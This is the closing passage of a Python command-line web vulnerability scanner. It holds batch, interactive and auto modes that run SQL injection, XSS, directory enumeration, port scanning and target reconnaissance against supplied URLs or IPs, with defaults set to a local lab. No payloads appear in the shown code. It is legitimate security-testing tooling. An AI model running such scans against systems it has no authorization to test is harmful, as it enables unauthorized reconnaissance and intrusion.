        if self.results["summary"]["recursive_urls_scanned"] > 0:
            print("\n🔄 RECURSIVE SCAN ANALYSIS:")
            print(f"  URLs Scanned: {self.results['summary']['recursive_urls_scanned']}")
            print(f"  Max Depth Reached: {self.results['summary']['recursive_max_depth']}")
            print(f"  New Paths Discovered: {self.results['summary']['recursive_paths_discovered']}")
            print(f"  Vulnerabilities Found: {self.results['summary']['recursive_vulnerabilities']}")
            print(f"  Forms Discovered: {self.results['summary']['recursive_forms']}")
            print(f"  Parameters Discovered: {self.results['summary']['recursive_parameters']}")

        if self.results["vulnerabilities"]:
            print("\n🔴 VULNERABILITIES FOUND:")
            for vuln in self.results["vulnerabilities"]:
                severity_icon = "🔴" if vuln["severity"] == "High" else "🟡" if vuln["severity"] == "Medium" else "🟢"
                print(f"  {severity_icon} {vuln['type']}: {vuln.get('evidence', 'Vulnerability detected')}")
                if vuln.get("parameter"):
                    print(f"      Parameter: {vuln['parameter']}")
                if vuln.get("url"):
                    print(f"      URL: {vuln['url']}")

        print(f"{'='*80}")


def batch_scan(targets_file, scan_types):
    """
    Perform batch scanning of multiple targets from a file.

    Args:
        targets_file (str): Path to file containing target URLs
        scan_types (list): List of scan types to perform

    Returns:
        dict: Combined results from all targets
    """
    # Read targets from file
    targets = []
    try:
        with open(targets_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # Add http:// if missing
                    if not line.startswith(("http://", "https://")):
                        line = f"http://{line}"
                    targets.append(line)
    except FileNotFoundError:
        print(f"❌ Targets file not found: {targets_file}")
        return None
    except Exception as e:
        print(f"❌ Error reading targets file: {e}")
        return None

    if not targets:
        print("❌ No valid targets found in file")
        return None

    # Enhanced batch scan banner
    print(f"\n{'='*80}")
    print("📁 BATCH WEB VULNERABILITY SCAN")
    print(f"{'='*80}")
    print(f"📋 Targets File: {targets_file}")
    print(f"🎯 Total Targets: {len(targets)}")
    print(f"🔍 Scan Types: {', '.join(scan_types).upper()}")
    print("📊 Expected Operations:")
    print("     • Target Information Gathering")
    print("     • Vulnerability Testing")
    print("     • Directory Enumeration")
    print("     • Security Analysis")
    print("     • Individual Result Export")
    print(f"{'='*80}")

    combined_results = {
        "batch_scan": True,
        "scan_timestamp": datetime.now().strftime("%m/%d/%y %H:%M"),
        "targets_file": targets_file,
        "total_targets": len(targets),
        "successful_scans": 0,
        "failed_scans": 0,
        "results": {},
    }

    # Scan each target
    for i, target_url in enumerate(targets, 1):
        print(f"\n{'='*80}")
        print(f"🎯 SCANNING TARGET {i}/{len(targets)}")
        print(f"{'='*80}")
        print(f"🌐 Target URL: {target_url}")
        print(f"📋 Scan Types: {', '.join(scan_types).upper()}")
        print(f"⏱️  Progress: {i}/{len(targets)} targets")
        print(f"{'='*80}")

        try:
            # Create scanner for this target
            scanner = CAWebVulnScanner(target_url)

            # Run comprehensive scan
            results = scanner.run_comprehensive_scan(scan_types=scan_types, deep_scan=True, port_scan=True)

            # Save individual results for this target (both JSON and CSV)
            timestamp = datetime.now().strftime("%d-%m")
            parsed_url = urlparse(target_url)
            target_name = parsed_url.hostname or parsed_url.path.replace("/", "_")
            if target_name.startswith("www."):
                target_name = target_name[4:]
            base_filename = f"Vuln_{target_name}_{timestamp}"

            # Save JSON
            json_filepath = os.path.join("Web_Scans", f"{base_filename}.json")
            with open(json_filepath, "w") as f:
                json.dump(results, f, indent=2)
            print(f"💾 JSON results saved to: {json_filepath}")

            # Save CSV
            csv_filepath = os.path.join("Web_Scans", f"{base_filename}.csv")
            scanner.export_csv(csv_filepath)
            print(f"💾 CSV results saved to: {csv_filepath}")

            # Add to combined results
            combined_results["results"][target_url] = results
            combined_results["successful_scans"] += 1

            print(f"✅ Successfully scanned: {target_url}")

        except Exception as e:
            print(f"❌ Failed to scan {target_url}: {e}")
            combined_results["results"][target_url] = {"error": str(e)}
            combined_results["failed_scans"] += 1

    print(f"\n{'='*80}")
    print("✅ BATCH SCAN COMPLETED")
    print(f"{'='*80}")
    print("📊 Summary:")
    print(f"   🎯 Total Targets: {combined_results['total_targets']}")
    print(f"   ✅ Successful: {combined_results['successful_scans']}")
    print(f"   ❌ Failed: {combined_results['failed_scans']}")
    print("   📁 Results Directory: Web_Scans/")
    print("   📄 Individual Files: Vuln_{target}_{date}.json & .csv")
    print("   📄 Combined File: Vuln_file_{date}.json")
    print("   📊 CSV Format: Enhanced with headers and sections")
    print(f"{'='*80}")

    return combined_results


def interactive_mode():
    """
    Run interactive mode for user-guided scanning.
    """
    print("\n" + "=" * 80)
    print("🌐 CA WEB VULNERABILITY SCANNER")
    print("🎮 INTERACTIVE MODE")
    print("=" * 80)
    print("📋 Available Features:")
    print("   • SQL Injection Testing")
    print("   • XSS Vulnerability Detection")
    print("   • Directory Enumeration")
    print("   • SSL/TLS Analysis")
    print("   • Security Headers Analysis")
    print("   • Target Information Gathering")
    print("   • Batch File Processing")
    print("=" * 80)

    print("Choose your target:")
    print("1. Enter URL manually")
    print("2. Enter IP address manually")
    print("3. Use file with multiple URLs")
    print("4. Use common test targets")
    print("5. Use localhost")

    while True:
        url_choice = input("\nChoose option (1-5): ").strip()

        if url_choice == "1":
            url = input("Enter target URL (e.g., http://example.com): ").strip()
            if url:
                break
            else:
                print("❌ Please enter a valid URL")
                continue
        elif url_choice == "2":
            ip = input("Enter IP address (e.g., 192.168.1.100): ").strip()
            if ip:
                url = f"http://{ip}"
                break
            else:
                print("❌ Please enter a valid IP address")
                continue
        elif url_choice == "3":
            print("\n📁 File Input:")
            print("Enter path to file containing URLs (one per line)")
            print("Example: web_targets.txt")
            file_path = input("File path: ").strip()
            if file_path and os.path.exists(file_path):
                print(f"📁 Using file: {file_path}")
                scan_types = get_scan_types_interactive()
                results = batch_scan(file_path, scan_types)
                if results:
                    timestamp = datetime.now().strftime("%d-%m")
                    file_output = os.path.join("Web_Scans", f"Vuln_file_{timestamp}.json")
                    with open(file_output, "w") as f:
                        json.dump(results, f, indent=2)
                    print(f"💾 File scan results exported to: {file_output}")
                return
            else:
                print("❌ File not found. Please enter a valid file path")
                continue
        elif url_choice == "4":
            url = "http://testphp.vulnweb.com"
            print(f"🎯 Using test target: {url}")
            break
        elif url_choice == "5":
            url = "http://localhost"
            print(f"🏠 Using localhost: {url}")
            break
        else:
            print("❌ Invalid choice. Please enter 1-5")

    # Get scan types
    scan_types = get_scan_types_interactive()

    # Create scanner and run scan
    scanner = CAWebVulnScanner(url)
    results = scanner.run_comprehensive_scan(scan_types=scan_types)

    # Export results
    scanner.export_results(format="json")
    scanner.print_summary()


def get_scan_types_interactive():
    """
    Get scan types from user in interactive mode.

    Returns:
        list: List of selected scan types
    """
    print("\n🔍 SCAN TYPES:")
    print("1. SQL Injection testing")
    print("2. XSS vulnerability testing")
    print("3. Directory enumeration")
    print("4. SSL/TLS analysis")
    print("5. Security headers analysis")
    print("6. Target information gathering (OS, IP, DNS, etc.)")
    print("7. Recursive path discovery and scanning")
    print("8. All scans")

    scan_type_map = {"1": "sql", "2": "xss", "3": "directory", "4": "ssl", "5": "headers", "6": "info", "7": "recursive", "8": "all"}

    while True:
        choice = input("\nChoose scan type (1-8): ").strip()

        if choice in scan_type_map:
            if choice == "8":
                return ["sql", "xss", "directory", "ssl", "headers", "info", "recursive"]
            else:
                return [scan_type_map[choice]]
        else:
            print("❌ Invalid choice. Please enter 1-8")


def auto_mode(target_url=None):
    """
    Run auto mode with comprehensive scanning.

    Args:
        target_url (str): Optional target URL (if provided via --target)
    """
    print("\n" + "=" * 80)
    print("🌐 CA WEB VULNERABILITY SCANNER")
    print("🤖 AUTO MODE")
    print("=" * 80)
    print("📋 Auto Mode Features:")
    print("   • Comprehensive Vulnerability Testing")
    print("   • Target Information Gathering")
    print("   • Deep Directory Enumeration")
    print("   • Security Headers Analysis")
    print("   • SSL/TLS Configuration Check")
    print("   • curl-based Header Analysis")
    print("=" * 80)

    # Default to local lab if not provided
    if not target_url:
        target_url = "http://localhost:8080"

    print(f"🎯 Target: {target_url}")
    print("📋 Scan Types: SQL, XSS, DIRECTORY, SSL, HEADERS, INFO, RECURSIVE")
    print("🔧 Tools Used: requests, beautifulsoup4, curl, dig, nmap, whois")
    print("=" * 80)

    # Comprehensive scan types - run everything
    scan_types = ["sql", "xss", "directory", "ssl", "headers", "info", "recursive"]

    # Create scanner and run scan
    scanner = CAWebVulnScanner(target_url)
    scanner.run_comprehensive_scan(scan_types=scan_types, deep_scan=True, port_scan=True)

    # Export results
    scanner.export_results(format="json")
    scanner.print_summary()


def main():
    """
    Main function to run the web vulnerability scanner.
    """
    parser = argparse.ArgumentParser(
        description="CA Web Vulnerability Scanner - Simplified web application security assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic web vulnerability scanning
  python3 CA_web_vuln.py --url http://example.com
  python3 CA_web_vuln.py --target 192.168.1.100
  python3 CA_web_vuln.py --file web_targets.txt --scan-type sql,xss
  python3 CA_web_vuln.py --target http://192.168.1.100 --scan-type sql,xss,headers
  python3 CA_web_vuln.py --url https://example.com --scan-type sql,xss,headers
  python3 CA_web_vuln.py --target 192.168.1.100 --output custom_results.json
  python3 CA_web_vuln.py --interactive  # Interactive mode
  python3 CA_web_vuln.py --auto  # Auto mode
        """,
    )

    parser.add_argument("--url", help="Target URL to scan (e.g., http://example.com)")
    parser.add_argument("--target", "-t", help="Target URL or IP address to scan (e.g., http://example.com, 192.168.1.100)")
    parser.add_argument("--file", "-f", help="File containing target URLs (one per line)")
    parser.add_argument("--interactive", action="store_true", help="Run in interactive mode")
    parser.add_argument("--output", help="Output file for results (default: auto-generated)")
    parser.add_argument("--scan-type", default="sql,xss,headers", help="Scan types: sql,xss,directory,ssl,headers,info,recursive (comma-separated)")
    parser.add_argument("--encrypt-results", action="store_true", help="Encrypt sensitive results using password")
    parser.add_argument("--password", help="Password for encryption (default: auto-generated)")
    parser.add_argument("--auto", "-a", action="store_true", help="Auto mode: Run comprehensive scan with default settings")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--test", action="store_true", help="Test mode: default to local CA lab (http://localhost:8080)")

    args = parser.parse_args()

    # Test helper: if --test and no explicit target/url, default to local lab URL
    if args.test and not (args.target or args.url):
        args.target = "http://localhost:8080"

    # File input mode (check first - highest priority)
    if args.file:
        if not os.path.exists(args.file):
            print(f"❌ Targets file not found: {args.file}")
            sys.exit(1)

        print(f"📁 Scanning targets from file: {args.file}")

        # Parse scan types
        if args.auto:
            # Auto mode with file input - use comprehensive scan types
            scan_types = ["sql", "xss", "directory", "ssl", "headers", "info", "recursive"]
            print("🤖 Auto mode enabled - using comprehensive scan types")
        else:
            # Default scan types
            scan_types = ["sql", "xss", "headers"]
            if args.scan_type:
                scan_types = [s.strip().lower() for s in args.scan_type.split(",")]

        # Perform batch scan
        results = batch_scan(args.file, scan_types)

        # Export file scan results
        if results:
            timestamp = datetime.now().strftime("%d-%m")
            file_output = os.path.join("Web_Scans", f"Vuln_file_{timestamp}.json")
            with open(file_output, "w") as f:
                json.dump(results, f, indent=2)
            print(f"💾 File scan results exported to: {file_output}")
        return

    # Auto mode (check second)
    if args.auto:
        # Check if target was provided with auto mode
        target_url = None
        if args.target:
            target_url = args.target
        elif args.url:
            target_url = args.url

        auto_mode(target_url)
        return

    # Interactive mode (check third)
    if args.interactive:
        interactive_mode()
        return

    # Single target mode
    target_url = None
    if args.target:
        target_url = args.target
    elif args.url:
        target_url = args.url

    if not target_url:
        print("❌ Target URL must be specified")
        print("💡 Use --target or --url for single target")
        print("💡 Use --file for multiple targets")
        print("💡 Use --interactive for guided setup")
        print("💡 Use --auto for automatic scanning")
        sys.exit(1)

    # Normalize target URL
    scanner = CAWebVulnScanner(target_url)
    target_url = scanner.normalize_target(target_url)

    # Parse scan types
    if args.auto:
        # Auto mode - use comprehensive scan types
        scan_types = ["sql", "xss", "directory", "ssl", "headers", "info", "recursive"]
    else:
        # Default scan types
        scan_types = ["sql", "xss", "headers"]
        if args.scan_type:
            scan_types = [s.strip().lower() for s in args.scan_type.split(",")]

    # Validate scan types
    valid_types = ["sql", "xss", "directory", "ssl", "headers", "info", "recursive"]
    invalid_types = [t for t in scan_types if t not in valid_types]

    if invalid_types:
        print(f"❌ Invalid scan types: {', '.join(invalid_types)}")
        print(f"💡 Valid scan types: {', '.join(valid_types)}")
        sys.exit(1)

    try:
        # Create scanner
        scanner = CAWebVulnScanner(target_url=target_url, output_file=args.output, encrypt_results=args.encrypt_results, password=args.password)

        # Run scan with deep scan and port scan enabled
        results = scanner.run_comprehensive_scan(scan_types=scan_types, deep_scan=True, port_scan=True)

        # Export results
        scanner.export_results(format="json")

        # Print summary
        scanner.print_summary()

        # Exit with appropriate code
        if results["summary"]["total_vulnerabilities"] > 0:
            print("\n⚠️  Vulnerabilities found!")
            sys.exit(1)
        else:
            print("\n✅ No vulnerabilities found!")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n⏹️  Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Scan failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
